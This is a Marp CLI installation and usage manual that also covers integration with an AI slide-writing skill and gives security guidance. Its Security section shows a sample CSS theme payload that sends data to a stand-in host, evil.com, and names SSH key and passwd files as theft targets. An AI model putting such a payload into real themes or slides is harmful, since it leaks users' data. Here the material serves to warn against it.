# Marp CLI — Installation & Usage Manual

**Marp CLI** is a command-line tool for converting Markdown presentations (with Marp markup) into HTML, PDF, PowerPoint, and images. Under the hood, it uses a headless browser to render slides.

## Table of Contents
- [Overview](#overview)
- [Dependencies](#dependencies)
- [Installation](#installation)
  - [Homebrew (macOS)](#1-homebrew-macos--recommended)
  - [NPM (global)](#2-npm-global)
  - [NPX (one-shot)](#3-npx-one-shot-without-installation)
  - [Standalone Binary](#4-standalone-binary)
  - [Docker](#5-docker)
- [Core Commands](#core-commands)
  - [Conversion](#conversion)
  - [Live Preview](#live-preview)
  - [Dev Server](#dev-server)
  - [Custom Themes](#custom-themes)
  - [Batch Processing](#batch-processing)
- [Configuration File](#configuration-file)
- [Integration with marp-slide Skill](#integration-with-marp-slide-skill)
- [Security](#security)
  - [The --html Flag](#the---html-flag--primary-risk)
  - [The --allow-local-files Flag](#the---allow-local-files-flag--filesystem-access)
  - [Custom Themes](#custom-themes-as-attack-vector)
  - [Safe Configuration](#safe-configuration)
  - [Threat Matrix](#threat-matrix)
  - [Recommendations](#recommendations)
- [Troubleshooting](#troubleshooting)
- [References](#references)

## Overview

Marp CLI takes a Markdown file with `marp: true` frontmatter and embedded CSS styles, then renders it into the chosen output format. Supported output formats:

| Format | Extension | Use Case |
|:---|:---|:---|
| HTML | `.html` | Interactive presentation in the browser |
| PDF | `.pdf` | For printing and sharing |
| PowerPoint | `.pptx` | MS Office compatibility |
| PNG | `.png` | Slide images (one per slide) |
| JPEG | `.jpg` | Compressed slide images |

## Dependencies

| Dependency | Purpose | Required? |
|:---|:---|:---|
| **Node.js v18+** | Runtime environment | Yes (except Homebrew / Standalone / Docker) |
| **Chrome / Edge / Firefox** | Rendering engine for PDF, PPTX, PNG export | Yes, for non-HTML export |

### Browser Auto-Detection

When exporting to PDF/PPTX/PNG, Marp CLI automatically searches for an installed browser in this order:
1. Google Chrome
2. Microsoft Edge
3. Mozilla Firefox

If none are found, HTML export still works without a browser.

### Verifying Dependencies

```bash
# Check Node.js version (need v18+)
node --version

# Check if Chrome is available (macOS)
ls /Applications/Google\ Chrome.app

# Check if Marp CLI is installed
marp --version
```

## Installation

### 1. Homebrew (macOS) — Recommended

The simplest option for macOS. Does not require a separate Node.js installation.

```bash
brew install marp-cli
```

**Update:**
```bash
brew upgrade marp-cli
```

**Verify:**
```bash
marp --version
```

### 2. NPM (global)

Best if Node.js is already installed. Provides the global `marp` command.

```bash
npm install -g @marp-team/marp-cli
```

**Update:**
```bash
npm update -g @marp-team/marp-cli
```

**For a specific project (local):**
```bash
npm install --save-dev @marp-team/marp-cli
```

With a local installation, `marp` is available via `npx marp` or in npm-scripts (`package.json`).

### 3. NPX (one-shot, without installation)

Downloads and runs the latest version without installing. Suitable for one-off conversions.

```bash
npx @marp-team/marp-cli@latest slides.md -o slides.html
```

Does not pollute the system, but re-downloads the package on every run.

### 4. Standalone Binary

Pre-built binaries are available on the [releases page](https://github.com/marp-team/marp-cli/releases):
- **Linux** (x64)
- **macOS** (Apple Silicon / x64)
- **Windows** (x64)

Node.js is bundled inside the binary — no additional installation required.

```bash
# macOS: download, extract, move
curl -L https://github.com/marp-team/marp-cli/releases/latest/download/marp-cli-macos.tar.gz | tar xz
mv marp /usr/local/bin/
```

**Standalone limitations:**
- Does not support configuration files in ES Module format
- Only specific architectures (no ARM Linux)

### 5. Docker

Full isolation — neither Node.js nor a browser is needed.

```bash
# Convert to PDF
docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli slides.md --pdf

# Convert to HTML
docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli slides.md -o slides.html
```

**Convenience alias** (add to `~/.zshrc`):
```bash
alias marp='docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli'
```

After that, use it like a regular command:
```bash
marp slides.md --pdf
```

## Core Commands

### Conversion

```bash
# Markdown → HTML
marp slides.md -o slides.html

# Markdown → PDF
marp slides.md --pdf
# or
marp slides.md -o slides.pdf

# Markdown → PowerPoint
marp slides.md --pptx
# or
marp slides.md -o slides.pptx

# Markdown → PNG (one image per slide)
marp slides.md --images png

# Markdown → JPEG
marp slides.md --images jpeg
```

### Live Preview

Watch mode automatically rebuilds the HTML when the source file changes:

```bash
marp -w slides.md -o slides.html
```

Open `slides.html` in a browser — it will auto-refresh on every save of the `.md` file.

### Dev Server

Starts a built-in HTTP server with live-reload:

```bash
# Serve all .md files in directory
marp -s ./slides/

# Serve on specific port
marp -s ./slides/ --port 3000
```

Open `http://localhost:8080` (or the specified port) in a browser.

### Custom Themes

Load an external CSS theme file:

```bash
# Use a single custom theme
marp --theme ./my-theme.css slides.md -o slides.html

# Use theme from URL
marp --theme https://example.com/theme.css slides.md

# Load a folder of themes (use any by name in frontmatter)
marp --theme-set ./themes/ slides.md --pdf
```

**Where to find community themes:**

| Source | Description |
|:---|:---|
| [Awesome Marp](https://github.com/marp-team/awesome-marp) | Official curated list |
| [Marp Community Themes](https://rnd195.github.io/marp-community-themes/) | Visual gallery with previews |
| [MarpX](https://github.com/cunhapaulo/MarpX) | Professional academic themes |
| [GitHub: marp-themes](https://github.com/topics/marp-themes) | All community repos |

**Quick start with an external theme:**
```bash
# Download a community theme
curl -O https://raw.githubusercontent.com/rnd195/my-marp-themes/main/themes/academic.css

# Render with it
marp --theme ./academic.css slides.md -o slides.html
```

> For detailed guides on developing custom themes and extending the marp-slide skill, see the [Marp Slide Creator Manual](marp-slide_manual.md#developing-custom-themes).

### Batch Processing

Convert all `.md` files in a directory:

```bash
# Convert all slides in folder to HTML
marp ./presentations/

# Convert all to PDF
marp --pdf ./presentations/

# With output directory
marp -o ./output/ ./presentations/
```

## Configuration File

Create a `.marprc.yml` in the project root for default settings:

```yaml
# .marprc.yml
allowLocalFiles: false
theme: ./assets/custom-theme.css
html: false
pdf: false
options:
  loggingLevel: warn
```

> **Note:** `allowLocalFiles` and `html` are `false` by default for security reasons. Only enable them for trusted content — see the [Security](#security) section below.
>
> **Scope note:** `.marprc.yml` is honored only by direct marp-cli invocations. The marp-slide skill's renderer (`scripts/render.py`) does **not** read this file — its flags are hardcoded (`--allow-local-files` always on, theme/format set via CLI args). Override via `scripts/render.py`'s own flags.

Supported configuration formats: `.marprc.yml`, `.marprc.yaml`, `.marprc.json`, `.marprc.js`, `marp.config.js`, `marp.config.mjs`.

## Integration with marp-slide Skill

The `marp-slide` skill writes a Marp `.md` file, then its own `scripts/render` wrapper pre-processes mermaid blocks into SVGs before handing the file to marp-cli. Three stages in a single pipeline:

```
┌──────────────┐   ┌──────────────────────────┐   ┌──────────────┐   ┌──────────────┐
│  marp-slide  │──▶│ scripts/render (venv py) │──▶│   Marp CLI   │──▶│   Output     │
│ (AI writes   │   │  mermaid → SVG via mmdc  │   │ (local bin)  │   │  pptx/pdf/   │
│    .md)      │   │  SHA1 cache in _assets/  │   │              │   │  html/png    │
└──────────────┘   └──────────────────────────┘   └──────────────┘   └──────────────┘
```

- **marp-slide** writes the `.md` file with embedded CSS, structured content, and proper Marp markup.
- **`scripts/render`** (the skill's own wrapper at `skills/marp-slide/scripts/render`) runs marp-cli from a local venv + `node_modules/` — no global installs needed — and pre-processes mermaid blocks via `mmdc`.
- **marp-cli** converts the rewritten markdown into the final format.
- **Alternative** — the Marp for VS Code extension (preview: `Cmd+Shift+V`, export via Command Palette). Note: VS Code preview does **not** pre-process mermaid, so diagrams there stay as code.

### Typical Workflow

```bash
# 1. Ask the AI to generate slides (marp-slide skill)
# → Output: presentation.md

# 2. One-time local dependency install
#    (creates .venv/ + node_modules/ under skills/marp-slide/scripts/)
bash skills/marp-slide/scripts/install.sh

# 3. Render with mermaid preprocessing
skills/marp-slide/scripts/render presentation.md --format pdf

# 4. For power users: call marp-cli directly (no mermaid preprocessing)
marp presentation.md --pdf
```

### Exit codes (from `scripts/render`)

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Bad arguments or missing input file |
| 2 | `marp` CLI not available — run `bash scripts/install.sh` |
| 3 | `marp` rendering failed or timed out (300 s per invocation) |
| 4 | Mermaid preprocessing failed AND `--strict-mermaid` was set |

Full flag reference in `skills/marp-slide/scripts/README.md`.

### Mermaid preprocessing

marp-cli alone does **not** render mermaid — a fenced ` ```mermaid ` block passed to vanilla marp comes out as unstyled code. The marp-slide skill closes that gap: `scripts/render.py` invokes `mmdc` on each mermaid block, caches the SVG at `<input>_assets/diagram-<sha1>.svg`, and rewrites the block as a Marp image directive (`![w:900](<stem>_assets/diagram-<sha1>.svg)`) before calling marp.

The cache key includes `mmdc --version` and the content of `scripts/mermaid-config.json` (if present), so toolchain upgrades or font-config edits invalidate cached SVGs automatically. For Cyrillic / CJK content drop a config with `fontFamily: Arial, sans-serif` at `skills/marp-slide/scripts/mermaid-config.json`; it is auto-loaded.

See `skills/marp-slide/scripts/README.md` for install, flags (`--no-mermaid`, `--strict-mermaid`, `--mermaid-config`), CI integration, and troubleshooting.

## Security

Marp CLI is designed with security-first defaults. The two most dangerous flags — `--html` and `--allow-local-files` — are **disabled by default**. Understanding when and why to enable them is critical.

### The `--html` Flag — Primary Risk

By default, Marp **strips** raw HTML tags from Markdown files. The `--html` flag removes this protection.

| Mode | Behavior | Risk |
|:---|:---|:---|
| Without `--html` (default) | HTML tags are ignored | Safe |
| With `--html` | HTML is rendered as-is | XSS possible if the file is from an untrusted source |

**Rule:** only enable `--html` for **your own** files. Never for files from third parties.

### The `--allow-local-files` Flag — Filesystem Access

By default, Marp CLI has **no access** to local files. This is intentional — the previous version of Marp (classic) [was exploited by attackers to steal local files](https://github.com/marp-team/marp-cli).

| Mode | Behavior | Risk |
|:---|:---|:---|
| Without flag (default) | Local images do not load | Safe |
| With `--allow-local-files` | Access to **any** file on disk | A malicious `.md` can read `/etc/passwd`, `~/.ssh/id_rsa`, etc. |

**Rule:** use `--allow-local-files` only with **trusted** Markdown files. For untrusted files, upload images online or encode them as base64.

> **Note for skill users:** the `marp-slide` skill's `scripts/render.py` inverts this default — it passes `--allow-local-files` unconditionally so marp can embed the skill's own cached SVGs under `<input>_assets/`. **Treat every `.md` you render via `scripts/render` as trusted.** For untrusted decks, bypass the wrapper and call `marp` directly with default-safe flags.

### Custom Themes as Attack Vector

A CSS theme can contain exfiltration payloads:

```css
/* Harmless */
section { background: #fff; }

/* Dangerous — data leak via external request */
section::after {
  content: url("https://evil.com/steal?data=...");
}
```

**Rule:** only use your own themes or themes from verified sources. The 7 built-in themes in the `marp-slide` skill are safe — they are stored locally in `assets/`.

### Safe Configuration

Recommended `.marprc.yml` for projects that accept external contributions:

```yaml
# .marprc.yml — safe defaults
allowLocalFiles: false   # disable local file access
html: false              # disable raw HTML rendering
```

### Threat Matrix

| Scenario | Threat Level | Mitigation |
|:---|:---|:---|
| Rendering **your own** file | Minimal | Safe to enable `--html` and `--allow-local-files` |
| Rendering a file from a **colleague** | Medium | Review the `.md` before rendering, do not enable `--html` |
| Rendering a file from the **internet** | High | No `--html`, no `--allow-local-files`, review CSS |
| Sharing **HTML export** | Medium | HTML files can contain JS — prefer sharing PDF |
| CI/CD pipeline | Medium | Docker isolation, fixed themes, no `--allow-local-files` |

### Recommendations

1. **For sharing** — export to PDF, not HTML. PDF does not execute JavaScript.
2. **For presenting** — HTML in browser, but only your own files.
3. **For CI/CD** — Docker container with fixed themes, no access flags.
4. **Images** — upload to CDN/GitHub and use HTTPS URLs instead of `--allow-local-files`.
5. **Do not trust** `.md` files from unverified PRs — review CSS and HTML blocks before rendering.

## Troubleshooting

| Problem | Cause | Fix |
|:---|:---|:---|
| `command not found: marp` | CLI not installed | `brew install marp-cli` or `npm i -g @marp-team/marp-cli` |
| PDF export fails | Chrome/Edge/Firefox not found | Install Chrome or specify path: `CHROME_PATH=/path/to/chrome marp --pdf` |
| Fonts look wrong in PDF | Fonts not installed on system | Install fonts locally or use Google Fonts via `@import url()` |
| Images not found in PDF | Relative paths not resolving | Use `--allow-local-files` or absolute paths |
| `PUPPETEER_TIMEOUT` error | Complex slide / slow machine | Increase timeout: `PUPPETEER_TIMEOUT=60000 marp --pdf` |
| Docker: permission denied | Volume mapping rights | Add `--user $(id -u):$(id -g)` to docker run |
| Standalone: config not loading | ES Module not supported | Use `.marprc.yml` instead of `marp.config.mjs` |

## References

- [Marp CLI — GitHub](https://github.com/marp-team/marp-cli)
- [@marp-team/marp-cli — npm](https://www.npmjs.com/package/@marp-team/marp-cli)
- [Marp CLI Releases](https://github.com/marp-team/marp-cli/releases)
- [Marp Official Site](https://marp.app/)
- [Marp for VS Code](https://marketplace.visualstudio.com/items?itemName=marp-team.marp-vscode)
